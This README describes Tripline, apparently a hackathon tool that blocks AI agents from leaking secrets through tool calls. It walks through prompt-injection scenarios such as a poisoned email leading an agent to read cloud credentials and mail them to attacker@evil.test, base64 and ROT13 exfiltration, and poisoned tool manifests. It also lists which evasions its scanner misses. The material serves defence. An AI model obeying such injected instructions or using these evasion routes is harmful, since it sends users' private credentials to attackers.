<div align="center">

<img src="docs/images/banner.png" alt="Tripline: stop AI agents from leaking your secrets" width="100%">

# Tripline

**An information flow firewall for AI agent tool calls.**
*Deterministic data flow rules between your agent and its tools. There is no model in the loop to fool.*

[![CI](https://github.com/Jean-Regis-M/tripline/actions/workflows/ci.yml/badge.svg)](https://github.com/Jean-Regis-M/tripline/actions/workflows/ci.yml)
![License](https://img.shields.io/badge/license-MIT-1f6f4a)
![Runtime dependencies](https://img.shields.io/badge/runtime%20dependencies-0-15130f)
![Track](https://img.shields.io/badge/GenHacks%202026-AI%2C%20Agentic%20Systems%2C%20Cybersecurity-d8391b)

**[Live demo](https://jean-regis-m.github.io/tripline/)** &nbsp;|&nbsp; **[Demo video](#demo-video)** &nbsp;|&nbsp; **[Architecture](docs/ARCHITECTURE.md)** &nbsp;|&nbsp; **[Security notes](SECURITY.md)**

</div>

---

## For judges: a 60 second path

1. **See it.** Open the [live demo](https://jean-regis-m.github.io/tripline/), pick *Poisoned e-mail steals cloud keys* and press *Replay step by step*. The left column leaks a key, the right column is stopped.
2. **Break it.** Paste your own tool manifest into the scanner, or edit the poisoned one and rescan.
3. **Trust it.** `npm install && npm test` runs 27 tests, including real MCP round trips over a stdio pipe and the bypasses an independent review found. `npm run evaluate` prints scanner quality, including the false positives it first had.

| Criterion | Where the evidence is |
|---|---|
| **Impact** | A concrete, current failure (agents obeying hidden instructions) with a defence usable today through the MCP proxy |
| **Technical execution** | Zero dependency TypeScript engine, 27 passing tests, CI, protocol level proxy test, measured scanner quality |
| **Creativity** | Data flow control instead of asking a model to detect attacks, plus a session level rule for paraphrased leaks |
| **Presentation** | This page, the live demo, and a captioned video made by scripts from the real app |

## The problem

An agent that reads email, browses the web and calls third party tools will **obey instructions hidden in that content**. One poisoned message is enough for it to open `~/.aws/credentials` and mail the contents to a stranger. Security researchers describe the dangerous combination as the *lethal trifecta*: access to private data, exposure to untrusted content, and a way to send data out. Asking the model to behave is not a control. It is a hope.

## The idea

Tripline sits between the agent and its tools and treats every tool call as a **data flow question**:

> *Did the data in this outgoing call come from somewhere private, and is the destination one the user approved?*

It answers with three small, deterministic rules that never consult the model. The model can be fooled completely and the secret still cannot leave.

<div align="center">
<img src="docs/images/01-hero.png" alt="Tripline landing page with the animated flow diagram" width="92%">
</div>

<div align="center">
<img src="docs/images/demo.gif" alt="Animated replay: the unprotected agent leaks, the protected agent is blocked" width="92%">
<br><sub>A real capture of the app: the same attack, unprotected on the left and behind Tripline on the right.</sub>
</div>

## What it contains

| Layer | What it does | Where |
|---|---|---|
| **Manifest scanner** | Static analysis of MCP style tool manifests: hidden instructions, invisible Unicode, steering of other tools, sensitive path references, external endpoints, encoded blobs, data smuggling parameters. Per tool risk score and a block, review or pass verdict. | [`src/scanner.ts`](src/scanner.ts) |
| **Rug pull lockfile** | SHA-256 over each tool's name, description and schema. Any later change, addition or removal is reported as drift. | [`src/pin.ts`](src/pin.ts) |
| **MCP proxy** | A stdio man in the middle for the Model Context Protocol: hides poisoned tools from `tools/list`, blocks leaking `tools/call` requests before they reach the server, and infers tool labels from names and schemas. | [`src/proxy.ts`](src/proxy.ts), [`src/infer.ts`](src/infer.ts) |
| **Runtime guard** | Labels outputs as *private* or *untrusted*, fingerprints private fragments (plus base64, hex and URL encodings) and checks every outbound call. | [`src/guard.ts`](src/guard.ts) |
| **Attack lab** | A reproducible, deliberately gullible agent plus five scenarios, so every claim can be replayed. | [`src/simulator.ts`](src/simulator.ts), [`src/scenarios.ts`](src/scenarios.ts) |
| **Web app** | The same engine compiled for the browser. No server, no data leaves the page. | [`web/`](web) |

## The three rules

```mermaid
flowchart TD
    A([Agent requests an egress tool call]) --> B{Destination on the allow list?}
    B -- yes --> OK([ALLOW])
    B -- no --> C{Arguments contain data read from a private source?}
    C -- yes --> R1([DENY: R1 private data leaving])
    C -- no --> D{Destination copied from untrusted content?}
    D -- yes --> R3([DENY: R3 attacker chosen destination])
    D -- no --> E{Session saw untrusted input and private data?}
    E -- yes --> R2([HOLD for approval: R2 lethal trifecta])
    E -- no --> OK
    classDef bad fill:#f6dfd6,stroke:#d8391b,color:#15130f
    classDef good fill:#dcebdf,stroke:#1f6f4a,color:#15130f
    classDef ask fill:#f3e6c8,stroke:#9a6412,color:#15130f
    class R1,R3 bad
    class OK good
    class R2 ask
```

## How a call is checked

```mermaid
sequenceDiagram
    participant U as User
    participant A as Agent
    participant T as Tripline
    participant X as Tools
    U->>A: Summarize my inbox
    A->>T: read_inbox()
    T->>X: allowed
    X-->>T: message with hidden instruction
    Note over T: labels output UNTRUSTED
    A->>T: read_file(~/.aws/credentials)
    T->>X: allowed (reading is not leaking)
    X-->>T: key material
    Note over T: labels output PRIVATE, fingerprints fragments
    A->>T: send_email(attacker@evil.test, key material)
    T--xA: DENY R1 and R3
    A->>T: save_note(summary)
    T->>X: allowed, user task completes
```

## See it work

All images below are real captures of the running app, taken with a script ([`scripts/screenshots.mjs`](scripts/screenshots.mjs)).

### A poisoned e-mail steals cloud keys, and is stopped

<img src="docs/images/03-replay-email-injection.png" alt="Side by side replay: the unprotected agent leaks the key, the protected agent is blocked by R1 and R3" width="100%">

### The attacker hides the key in base64

<img src="docs/images/04-replay-encoded-exfil.png" alt="Base64 encoded exfiltration blocked" width="100%">

### Transformed data no string match can see

The secret is ROT13 encoded, so no fragment can be matched. The session level rule R2 notices that this agent has read untrusted content *and* private data and holds the send for approval.

<img src="docs/images/05-replay-paraphrased-exfil.png" alt="Paraphrased exfiltration triggers the approval rule" width="100%">

### Legitimate work is untouched

<img src="docs/images/06-replay-benign-forward.png" alt="Benign task: private data sent to an allow listed address passes" width="100%">

### Scanner and rug pull detection

<table>
<tr>
<td width="50%"><img src="docs/images/07-scanner-blocked.png" alt="Scanner blocks a poisoned manifest with evidence"></td>
<td width="50%"><img src="docs/images/08-rug-pull-drift.png" alt="Lockfile verification reports drift after a rug pull"></td>
</tr>
</table>

### Phone friendly

<img src="docs/images/11-mobile-hero.png" alt="Mobile layout" width="260"> &nbsp; <img src="docs/images/12-mobile-replay.png" alt="Mobile attack replay" width="260">

## Results

These figures come from `npm test` and from the **Results** section of the live app. They are computed from the same scenarios, not typed in.

| Scenario | Type | Leaks without Tripline | Leaks with Tripline | User task still completes | Calls blocked |
|---|---|:---:|:---:|:---:|:---:|
| Poisoned e-mail steals cloud keys | attack | **yes** | no | yes | 1 |
| Poisoned tool description smuggles an SSH key | attack | **yes** | no | yes | 1 |
| Web page injection, base64 encoded exfiltration | attack | **yes** | no | yes | 1 |
| Transformed data that no string match can see | attack | **yes** | no | yes | 1 (approval) |
| Legitimate: mail my own to do list to myself | benign | no | no | yes | **0** |

Four of four scripted attacks succeed unprotected and are stopped. The benign task, which sends private data to an allow listed address, is never blocked.

## Measured scanner quality

Run `npm run evaluate`. The corpus has 21 realistic legitimate tool descriptions (including awkward ones such as "run lint before commit" and "you should call list_projects first") and 30 poisoned variants (10 attack styles on 3 base tools).

| Measure | Result |
|---|---|
| Legitimate tools hard blocked (false positives) | **0 of 21** |
| Legitimate tools sent to review | 2 of 21 (an external URL, and a description that mentions `.env`) |
| Poisoned tools detected (blocked or sent to review) | **27 of 30** |
| Poisoned tools hard blocked | 21 of 30 |
| Known misses | 3, all the same attack: a plain language request with no keyword or hidden character |

**Read this carefully:** the corpus was written by the same person who wrote the rules, so this is regression evidence, not an independent benchmark. The first version of the rules wrongly blocked 3 of the 21 legitimate tools; that was fixed by downgrading generic imperatives and bare path mentions to review level, and the test suite now guards it.

## Quick start

Requires **Node 22.18 or newer** (it runs TypeScript directly). The engine has **zero runtime dependencies**.

```bash
git clone https://github.com/Jean-Regis-M/tripline.git
cd tripline
npm install          # dev tools only: typescript, playwright-core
npm run build        # compiles the engine for the browser
npm start            # http://localhost:3000
```

```bash
npm test             # 27 tests, including real stdio MCP round trips and adversarial bypass cases
npm run evaluate     # scanner quality on the bundled corpus
npm run typecheck
npm run scan         # CLI: scan the poisoned fixture
```

### Command line

```bash
node src/cli.ts scan fixtures/poisoned.manifest.json    # exits 1 when the verdict is block
node src/cli.ts lock fixtures/clean.manifest.json       # writes tripline.lock.json
node src/cli.ts verify fixtures/clean.manifest.json     # exits 1 on drift
```

### Put it in front of a real MCP server

Tripline speaks MCP's newline delimited JSON-RPC over stdio, so it can wrap any stdio server. Point your client at the proxy instead of the server:

```json
{
  "mcpServers": {
    "files": {
      "command": "node",
      "args": ["/path/to/tripline/src/cli.ts", "proxy", "--allow", "me@example.com", "--",
               "npx", "-y", "@modelcontextprotocol/server-filesystem", "/home/me/work"]
    }
  }
}
```

The proxy scans `tools/list`, removes tools with critical or high findings, infers private, untrusted and egress labels from tool names and schemas (override them with `--policy policy.json`), and refuses leaking `tools/call` requests with an MCP error result. It **fails closed**: calls before the first `tools/list`, JSON-RPC batches containing `tools/call`, `tools/call` notifications and unparseable lines are dropped, never forwarded. Add `--lock tripline.lock.json` to pin tools on first use and hide any tool that later changes. Results are observed through `content`, embedded resources and `structuredContent`. Rule R2 is **denied unless an approver says yes**: the library takes an `approve` callback, and the command line has no interactive prompt yet. Integration tests ([`test/proxy.test.ts`](test/proxy.test.ts), [`test/hardening.test.ts`](test/hardening.test.ts)) drive this over a real stdio pipe against a bundled MCP server and prove that a blocked call never reaches the server. The snippet above is illustrative: **it has not been run against third party servers yet.**

### Use the guard in your own agent loop

```ts
import { Guard } from './src/guard.ts';

const guard = new Guard({
  allowedDestinations: ['student.test'],
  tools: {
    read_inbox: { ingestsUntrusted: true },
    read_file:  { reads: 'private' },
    send_email: { egress: true, destinationParam: 'to' },
  },
});

const verdict = guard.check('send_email', { to, body });
if (verdict.decision !== 'allow') return refuse(verdict.rules);   // 'deny' or 'ask'
const output = await tools.send_email({ to, body });
guard.observe('send_email', output);                              // record every result
```

## Design decisions

* **Deterministic over probabilistic.** A guard that asks a model whether a call looks malicious can be prompt injected too. These rules are plain code you can read in a few minutes.
* **Reading is not leaking.** The injected `read_file` is allowed and only the egress is judged. This keeps false positives near zero and keeps the agent useful.
* **Defence in depth.** The scanner catches poisoned tools before install, the lockfile catches changes after approval, and the guard catches whatever still gets through.
* **Isomorphic engine.** One TypeScript source runs in Node, in tests and in the browser. SHA-256 and base64 helpers are written without `Buffer` or `node:crypto` and verified against Node's implementation in the test suite.
* **Honest simulation.** Real model behaviour is non deterministic, so the attacked agent is scripted. That makes every number reproducible, and the limits below say exactly what that does and does not prove.

## Limitations

* The demo agent is a **scripted stand in**, not a live language model, and the attacks were written by the same person who wrote the rules. Tripline's decisions come from deterministic code, and a real model only changes what the agent *attempts*. This is not a proof of security.
* Provenance is **fragment based**. Copies, case and spacing changes, reversal, base64, base64url, hex and URL encoding, and a secret split across arguments are caught. ROT13, substitution ciphers and paraphrase are not, and are caught only by rule R2 in a session that has seen both untrusted input and private data. Short digit-free secrets under 12 characters are not tracked.
* **Policy needs labels.** Tools are labelled by hand or by a name based heuristic in the proxy. An unusual tool name can be mislabelled, and an unlabelled tool is treated as harmless.
* The scanner is **heuristic** and has false negatives (a plain language request with no keyword passes). It is one layer, not the whole defence.
* **R2 is blunt.** A legitimate send to a non allow-listed address in a session that has read untrusted content and private data is held, and with no approver it is refused.
* The proxy treats a tool as an outbound channel only if its name or schema says so, or if an argument carries an external URL. A server that exposes an oddly named channel tool can be missed.
* Verified over the real MCP stdio protocol against a bundled test server, but **not yet against third party servers or live model traffic**. That is the first roadmap item.

## Roadmap

1. Run the proxy against popular third party MCP servers and real model clients, and publish the results.
2. Evaluation against public prompt injection benchmarks with real models.
3. Policy inference from tool schemas and a visual policy editor.
4. Structured audit log export.

## Repository layout

```
src/        engine (scanner, pin, guard, infer, simulator, scenarios), MCP proxy, CLI, static server
web/        browser app, compiled engine goes to web/engine at build time
test/       node:test suite
fixtures/   clean and poisoned example manifests
scripts/    reproducible screenshots, video and thumbnail generators
docs/       architecture notes and the images used here
```

## Demo video

A narrated, captioned walkthrough of the running app (under three minutes). The link is added after upload: see the Devpost project page.

## Honest credits and disclosure

Built from scratch during the GenHacks 2026 period (started 18 November 2026). Written with **Claude Code** (Anthropic) as an AI pair programmer, and every behaviour claimed here is covered by a test or reproducible with the scripts. Narration uses the Windows built in synthetic voice *Microsoft Zira*. Dev tooling: Node.js, TypeScript, `playwright-core` driving Microsoft Edge, FFmpeg. See [THIRD-PARTY.md](THIRD-PARTY.md).

**Ideas this work builds on:** CaMeL, *Defeating Prompt Injections by Design* ([arXiv 2503.18813](https://arxiv.org/abs/2503.18813)), Simon Willison's *lethal trifecta*, OWASP's LLM Top 10 entry on prompt injection, and public research on MCP tool poisoning and rug pulls. Tripline is an independent implementation, not a port of any of them. All secrets in the scenarios are synthetic, and the AWS pair is the documented example key from AWS's own documentation.

## License

[MIT](LICENSE)
